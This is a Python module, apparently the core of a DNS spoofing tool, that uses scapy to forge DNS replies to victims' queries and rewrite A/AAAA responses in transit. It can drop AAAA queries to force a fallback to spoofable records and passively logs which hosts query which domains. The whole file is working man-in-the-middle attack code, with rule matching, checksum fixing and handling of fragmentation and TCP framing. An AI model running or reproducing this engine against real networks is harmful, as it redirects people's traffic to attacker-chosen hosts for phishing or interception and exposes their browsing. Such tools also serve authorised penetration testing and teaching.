"""Core DNS spoofing engine.

The engine is deliberately free of any NetfilterQueue / iptables coupling so
that it can be unit-tested on any platform.  It operates on raw packet bytes
(bytes in, bytes out):

    engine = DnsSpoofEngine(rules)
    out = engine.process_payload(payload)   # None means "drop this packet"

Two interception modes are supported:

* ``reply``  (default) - the engine answers DNS *queries* with a forged
  response and drops the original query.  This is the most reliable mode:
  it works even when the real DNS response has already been forwarded, and
  the victim's resolver accepts the answer because the transaction id and
  ports of the original query are echoed back.

* ``mutate`` - the engine rewrites DNS *responses* that are in transit
  (the behaviour of the original one-file script).
"""

from __future__ import annotations

import ipaddress
import logging
from collections import Counter
from dataclasses import dataclass, field
from typing import List, Optional, Tuple

from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, TCP, UDP
from scapy.packet import Packet

log = logging.getLogger("spoofshifter")

#: Human readable names for the query types we care about.
TYPE_NAMES = {1: "A", 2: "NS", 5: "CNAME", 6: "SOA", 12: "PTR", 15: "MX", 16: "TXT", 28: "AAAA"}

_QTYPE_A = 1
_QTYPE_AAAA = 28
_SPOOFABLE_QTYPES = (_QTYPE_A, _QTYPE_AAAA)


class SpoofError(Exception):
    """Raised for configuration problems (bad rule, bad address, ...)."""


@dataclass(frozen=True)
class SpoofRule:
    """One spoofing rule: a domain pattern and the address(es) to answer with."""

    domain: str
    ipv4: Optional[str] = None
    ipv6: Optional[str] = None
    ttl: int = 300

    def __post_init__(self) -> None:
        if not self.domain or not self.domain.strip():
            raise SpoofError("rule domain must not be empty")
        if self.ipv4 is None and self.ipv6 is None:
            raise SpoofError(
                f"rule for {self.domain!r} needs at least one spoof address (ipv4 and/or ipv6)"
            )
        if self.ipv4 is not None:
            try:
                addr = ipaddress.ip_address(self.ipv4)
            except ValueError as exc:
                raise SpoofError(f"invalid IPv4 address for {self.domain!r}: {self.ipv4!r}") from exc
            if addr.version != 4:
                raise SpoofError(f"{self.ipv4!r} is not an IPv4 address")
        if self.ipv6 is not None:
            try:
                addr = ipaddress.ip_address(self.ipv6)
            except ValueError as exc:
                raise SpoofError(f"invalid IPv6 address for {self.domain!r}: {self.ipv6!r}") from exc
            if addr.version != 6:
                raise SpoofError(f"{self.ipv6!r} is not an IPv6 address")
        if self.ttl < 0:
            raise SpoofError("ttl must be >= 0")


@dataclass
class PacketStats:
    """Counters exposed at shutdown so the operator sees what happened."""

    seen: int = 0                 # packets that entered the engine
    queries: int = 0              # matching queries/answers that were handled
    spoofed: int = 0              # packets actually rewritten with a spoofed answer
    dropped: int = 0              # packets dropped on purpose (e.g. AAAA fallback)
    forwarded: int = 0            # packets let through untouched
    errors: int = 0               # packets that could not be processed
    query_counts: Counter = field(default_factory=Counter)  # qname -> query count

    def record_query(self, qname: str) -> None:
        """Count one DNS query for the given name (for --top-domains)."""
        self.query_counts[normalize_qname(qname)] += 1

    def top_domains(self, limit: int = 10) -> List[Tuple[str, int]]:
        """Most-queried domains, ranked by count then name (ties alphabetical)."""
        return sorted(self.query_counts.items(), key=lambda item: (-item[1], item[0]))[:limit]

    def summary(self) -> str:
        return (
            "summary: {seen} packets seen | {queries} matched | {spoofed} spoofed | "
            "{dropped} dropped | {forwarded} forwarded | {errors} errors"
        ).format(**self.__dict__)


# ---------------------------------------------------------------------------
# Domain matching
# ---------------------------------------------------------------------------

def normalize_qname(qname: str) -> str:
    """Normalize a domain name: lowercase, no trailing dot, no whitespace."""
    return qname.strip().strip(".").lower()


def decode_qname(qname: object) -> str:
    """Decode a DNS qname (wire format bytes or plain string) to 'example.com'.

    Scapy keeps ``DNSQR.qname`` in wire format (length-prefixed labels), e.g.
    ``b"\\x03www\\x06google\\x03com\\x00"``.  This handles both that form and
    a plain string/ASCII-bytes form.
    """
    if isinstance(qname, str):
        return normalize_qname(qname)
    if not isinstance(qname, bytes):
        return normalize_qname(str(qname))
    labels: List[str] = []
    i, n = 0, len(qname)
    while i < n:
        length = qname[i]
        if length == 0:
            break
        if length & 0xC0 == 0xC0:  # compression pointer - cannot resolve here
            break
        i += 1
        if i + length > n:
            break
        labels.append(qname[i:i + length].decode("ascii", "replace"))
        i += length
    if labels:
        return normalize_qname(".".join(labels))
    # Not valid wire format - treat the bytes as a plain string.
    return normalize_qname(qname.decode("ascii", "replace").replace("\x00", ""))


def match_rule(qname: str, rules: List[SpoofRule]) -> Optional[SpoofRule]:
    """Return the best matching rule for ``qname`` or None.

    * ``example.com`` matches only that exact name.
    * ``*.example.com`` matches ``example.com`` itself and any subdomain.
    * An exact match always beats a wildcard; among wildcards the longest
      suffix wins.  Matching is case-insensitive.
    """
    qname = normalize_qname(qname)
    best: Optional[Tuple[int, SpoofRule]] = None
    for rule in rules:
        pattern = normalize_qname(rule.domain)
        if pattern.startswith("*."):
            suffix = pattern[2:]
            if qname == suffix or qname.endswith("." + suffix):
                score = len(suffix) + 10000
            else:
                continue
        elif qname == pattern:
            score = len(pattern) + 20000
        else:
            continue
        if best is None or score > best[0]:
            best = (score, rule)
    return best[1] if best else None


# ---------------------------------------------------------------------------
# Spoofed response construction
# ---------------------------------------------------------------------------

def build_spoofed_response(query_pkt: Packet, rule: SpoofRule, qtype: int) -> Optional[Packet]:
    """Build a forged DNS response for ``query_pkt`` (an A/AAAA query).

    The response echoes the query's transaction id, source/destination IPs and
    ports, sets the QR/AA/RA flags and carries the spoofed answer.  Length and
    checksum fields are removed so Scapy recalculates them on serialization.

    Returns None when the rule has no address of the requested type (e.g. an
    AAAA query for a rule that only defines an IPv4 address).
    """
    if qtype == _QTYPE_A:
        rdata = rule.ipv4
    elif qtype == _QTYPE_AAAA:
        rdata = rule.ipv6
    else:
        return None
    if rdata is None:
        return None

    dns = query_pkt[DNS]
    question = query_pkt[DNSQR]

    answer = DNSRR(rrname=question.qname, type=qtype, rclass=1, ttl=rule.ttl, rdata=rdata)
    question_copy = DNSQR(qname=question.qname, qtype=question.qtype, qclass=question.qclass)

    response = (
        IP(src=query_pkt[IP].dst, dst=query_pkt[IP].src)
        / UDP(sport=query_pkt[UDP].dport, dport=query_pkt[UDP].sport)
        / DNS(
            id=dns.id,
            qr=1,
            opcode=dns.opcode,
            aa=1,
            tc=0,
            rd=dns.rd,
            ra=1,
            z=0,
            ad=0,
            cd=0,
            rcode=0,
            qdcount=1,
            ancount=1,
            nscount=0,
            arcount=0,
            qd=question_copy,
            an=answer,
        )
    )
    # Scapy recomputes IP/UDP length and checksums when these are deleted.
    del response[IP].len
    del response[IP].chksum
    del response[UDP].len
    del response[UDP].chksum
    return response


# ---------------------------------------------------------------------------
# Wire-level guards
# ---------------------------------------------------------------------------

def _is_ip_fragment(payload: bytes) -> bool:
    """True if the IPv4 packet is a fragment (MF flag or non-zero offset).

    Rewriting a fragment changes its payload length, which breaks reassembly
    at the receiver, so fragmented packets must never be modified.
    """
    if len(payload) < 20:
        return False
    frag_field = int.from_bytes(payload[6:8], "big")
    more_fragments = bool(frag_field & 0x2000)  # bit 13
    offset = frag_field & 0x1FFF
    return more_fragments or offset != 0


def _tcp_segment_has_single_complete_dns(payload: bytes, pkt: Packet) -> bool:
    """True if the TCP segment carries exactly one complete DNS message.

    DNS over TCP is framed with a 2-byte length prefix.  A segment may hold
    only part of a message (segmentation) or several messages (coalescing);
    rewriting either corrupts the stream, so only single, complete messages
    are candidates for rewriting.
    """
    tcp_header_len = pkt[TCP].dataofs * 4
    raw = payload[pkt.ihl * 4 + tcp_header_len:]
    if len(raw) < 2:
        return False
    declared = int.from_bytes(raw[:2], "big")
    return len(raw) == 2 + declared


# ---------------------------------------------------------------------------
# Engine
# ---------------------------------------------------------------------------

class DnsSpoofEngine:
    """Processes captured packets against a set of spoofing rules."""

    def __init__(self, rules: List[SpoofRule], mode: str = "reply", stats: Optional[PacketStats] = None) -> None:
        if mode not in ("reply", "mutate", "listen"):
            raise SpoofError(f"unknown mode {mode!r} (expected 'reply', 'mutate' or 'listen')")
        self.rules = list(rules)
        self.mode = mode
        self.stats = stats or PacketStats()

    def process_payload(self, payload: bytes) -> Optional[bytes]:
        """Process one captured packet.

        Returns the (possibly modified) payload to re-inject, or None to drop
        the packet.  Never raises: malformed or unexpected traffic is passed
        through untouched.
        """
        self.stats.seen += 1
        try:
            pkt = IP(payload)
        except Exception:
            self.stats.errors += 1
            log.debug("unparseable packet, passing through", exc_info=True)
            return payload
        if not pkt.haslayer(DNS):
            return payload
        try:
            if self.mode == "reply":
                return self._process_reply_mode(pkt, payload)
            if self.mode == "listen":
                return self._process_listen_mode(pkt, payload)
            return self._process_mutate_mode(pkt, payload)
        except Exception:
            self.stats.errors += 1
            log.exception("error while processing packet, passing it through")
            return payload

    # -- mode: reply --------------------------------------------------------
    def _process_reply_mode(self, pkt: Packet, payload: bytes) -> Optional[bytes]:
        dns = pkt[DNS]
        if dns.qr != 0 or not pkt.haslayer(DNSQR):
            return payload  # only answer queries
        self.stats.record_query(decode_qname(pkt[DNSQR].qname))
        if pkt.haslayer(TCP):
            return payload  # cannot safely inject TCP responses
        if _is_ip_fragment(payload):
            self.stats.forwarded += 1
            return payload  # a forged reply would break reassembly
        question = pkt[DNSQR]
        qtype = question.qtype
        if qtype not in _SPOOFABLE_QTYPES:
            self.stats.forwarded += 1
            return payload
        qname = decode_qname(question.qname)
        rule = match_rule(qname, self.rules)
        if rule is None:
            self.stats.forwarded += 1
            return payload

        self.stats.queries += 1
        response = build_spoofed_response(pkt, rule, qtype)
        if response is None:
            # A/AAAA query we cannot answer (e.g. AAAA with an IPv4-only rule):
            # drop it so the client falls back to the record type we can spoof.
            self.stats.dropped += 1
            log.info(
                "[+] dropping %s query for %s (no matching %s rule)",
                TYPE_NAMES.get(qtype, qtype), qname, TYPE_NAMES.get(qtype, qtype),
            )
            return None
        self.stats.spoofed += 1
        rdata = rule.ipv4 if qtype == _QTYPE_A else rule.ipv6
        log.info("[+] spoofing %s %s -> %s (ttl=%d)", qname, TYPE_NAMES[qtype], rdata, rule.ttl)
        return bytes(response)

    # -- mode: listen -------------------------------------------------------
    def _process_listen_mode(self, pkt: Packet, payload: bytes) -> Optional[bytes]:
        """Passive recon: log DNS queries, modify nothing, drop nothing."""
        dns = pkt[DNS]
        if dns.qr == 0 and pkt.haslayer(DNSQR):
            question = pkt[DNSQR]
            qname = decode_qname(question.qname)
            self.stats.queries += 1
            self.stats.record_query(qname)
            log.info(
                "[+] query %s (%s) from %s",
                qname,
                TYPE_NAMES.get(question.qtype, question.qtype),
                pkt[IP].src,
            )
        return payload

    # -- mode: mutate -------------------------------------------------------
    def _process_mutate_mode(self, pkt: Packet, payload: bytes) -> Optional[bytes]:
        dns = pkt[DNS]
        if dns.qr != 1 or not pkt.haslayer(DNSQR) or not pkt.haslayer(DNSRR):
            return payload  # only rewrite in-flight responses
        if _is_ip_fragment(payload):
            self.stats.forwarded += 1
            return payload  # changing the payload length breaks reassembly
        question = pkt[DNSQR]
        qtype = question.qtype
        if qtype not in _SPOOFABLE_QTYPES:
            return payload
        qname = decode_qname(question.qname)
        rule = match_rule(qname, self.rules)
        if rule is None:
            self.stats.forwarded += 1
            return payload

        rdata = rule.ipv4 if qtype == _QTYPE_A else rule.ipv6
        if rdata is None:
            self.stats.forwarded += 1
            return payload

        is_tcp = pkt.haslayer(TCP)
        if is_tcp and not _tcp_segment_has_single_complete_dns(payload, pkt):
            # Segmented or coalesced DNS: the segment does not hold one whole
            # message, so it cannot be rewritten without corrupting the stream.
            self.stats.forwarded += 1
            log.debug("TCP DNS segment is not a single complete message, forwarding")
            return payload

        self.stats.queries += 1
        dns.an = DNSRR(rrname=question.qname, type=qtype, rclass=1, ttl=rule.ttl, rdata=rdata)
        dns.ancount = 1
        dns.nscount = 0
        dns.arcount = 0
        # Drop the original NS/additional records: zeroing the counts alone is
        # not enough - scapy still serializes the leftover record objects.
        dns.ns = []
        dns.ar = []

        del pkt[IP].len
        del pkt[IP].chksum
        if is_tcp:
            del pkt[TCP].chksum
            rewritten = bytes(pkt)
            if len(rewritten) != len(payload):
                # Changing the segment size would break TCP sequence/ACK
                # accounting; keep the original response untouched.
                self.stats.forwarded += 1
                log.info(
                    "[+] skipping TCP rewrite of %s %s: new answer changes the "
                    "segment length", qname, TYPE_NAMES[qtype],
                )
                return payload
            self.stats.spoofed += 1
            log.info("[+] rewriting %s %s -> %s (mode=mutate, tcp)", qname, TYPE_NAMES[qtype], rdata)
            return rewritten

        del pkt[UDP].len
        del pkt[UDP].chksum
        self.stats.spoofed += 1
        log.info("[+] rewriting %s %s -> %s (mode=mutate)", qname, TYPE_NAMES[qtype], rdata)
        return bytes(pkt)
